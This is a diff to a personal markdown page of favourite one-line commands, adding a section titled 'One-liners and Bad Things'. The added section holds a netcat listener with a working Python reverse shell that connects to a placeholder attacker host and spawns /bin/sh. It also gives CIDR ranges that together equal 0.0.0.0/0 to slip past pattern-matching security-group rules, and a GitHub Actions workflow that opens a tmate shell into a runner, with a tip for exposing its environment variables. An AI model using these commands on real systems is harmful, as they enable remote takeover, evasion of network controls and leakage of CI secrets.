@@ -2,7 +2,58 @@
 description: My favorite one-line commands
 ---
 
-# One-liners
+# One-liners and Bad Things
+
+## Reverse Shell
+
+The attacker machine must be public and exposed to the internet.
+
+Run this on the attacker machine:
+
+```
+nc -lp 1337
+```
+
+Run this on the victim machine:
+
+{% code overflow="wrap" %}
+```
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("BAD_IP_ADDRESS_HERE",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+{% endcode %}
+
+If you're in an environment that restricts security groups that match 0.0.0.0/0, chances are they are doing pattern matching and not reasoning about effective network access. You can create an EC2 instance with security groups matching these IP ranges and it will be **effectively the same as 0.0.0.0/0**:
+
+```
+1.0.0.0/8
+2.0.0.0/7
+4.0.0.0/6
+8.0.0.0/5
+16.0.0.0/4
+32.0.0.0/3
+64.0.0.0/2
+128.0.0.0/1
+```
+
+### Reverse Shell in GitHub Actions
+
+```
+name: Reverse Shell Pentesting
+
+on: workflow_dispatch
+
+jobs:
+  reverse-shell:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v4
+    
+    - name: Setup tmate session
+      uses: mxschmitt/action-tmate@v3
+      timeout-minutes: 60
+```
+
+Run it and you'll see that it prints out an SSH command for you to connect with. You can add `env` to the "Setup tmate session" step to expose environment variables that are available to your GitHub actions workflow.
 
 ## Git
 
@@ -54,7 +105,7 @@ EOF
 }
 ```
 
-My post that explains the above is [here](https://kmcquade.com/2020/11/nuking-all-azure-resource-groups-under-all-azure-subscriptions/). 
+My post that explains the above is [here](https://kmcquade.com/2020/11/nuking-all-azure-resource-groups-under-all-azure-subscriptions/).&#x20;
 
 ## AWS
 
